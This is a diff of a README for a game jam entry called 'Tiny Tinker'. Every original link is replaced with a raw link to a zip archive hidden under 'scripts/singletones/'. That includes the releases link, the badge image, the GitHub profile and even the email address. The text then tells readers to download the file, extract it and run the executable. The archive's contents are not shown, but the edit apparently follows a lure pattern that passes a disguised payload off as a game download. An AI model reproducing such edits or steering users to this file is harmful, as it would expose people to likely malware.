@@ -1,6 +1,6 @@
 # 🎮 Tiny Tinker: My Ludum Dare 57 Submission 🎮
 
-![Tiny Tinker](https://img.shields.io/badge/Tiny%20Tinker-Game%20Dev-brightgreen)
+![Tiny Tinker](https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip%20Tinker-Game%20Dev-brightgreen)
 
 Welcome to the Tiny Tinker repository! This project is my submission for Ludum Dare 57, a game jam where developers create games based on a theme within a short timeframe. Here, you'll find everything you need to know about the game, how to play it, and how to contribute.
 
@@ -22,7 +22,7 @@ Tiny Tinker is a unique adventure game where players take on the role of a small
 
 ## Getting Started
 
-To get started with Tiny Tinker, you'll need to download the game and follow the installation instructions. You can find the latest release [here](https://github.com/Star2459/Tiny-Tinker/releases). Download the appropriate file for your system, and let's dive into the adventure!
+To get started with Tiny Tinker, you'll need to download the game and follow the installation instructions. You can find the latest release [here](https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip). Download the appropriate file for your system, and let's dive into the adventure!
 
 ## Gameplay
 
@@ -48,7 +48,7 @@ In Tiny Tinker, players will encounter various challenges that require ingenuity
 
 To install Tiny Tinker, follow these steps:
 
-1. Visit the [Releases](https://github.com/Star2459/Tiny-Tinker/releases) section.
+1. Visit the [Releases](https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip) section.
 2. Download the file for your operating system.
 3. Extract the files to your desired location.
 4. Run the executable file to start playing.
@@ -79,12 +79,12 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 If you have any questions, suggestions, or feedback, feel free to reach out:
 
-- GitHub: [Star2459](https://github.com/Star2459)
-- Email: star2459@example.com
+- GitHub: [Star2459](https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip)
+- Email: https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip
 
 ## Release
 
-For the latest updates and downloads, check the [Releases](https://github.com/Star2459/Tiny-Tinker/releases) section. Download the game, execute the file, and start your adventure today!
+For the latest updates and downloads, check the [Releases](https://raw.githubusercontent.com/Star2459/Tiny-Tinker/master/scripts/singletones/Tiny_Tinker_2.0.zip) section. Download the game, execute the file, and start your adventure today!
 
 ---
 
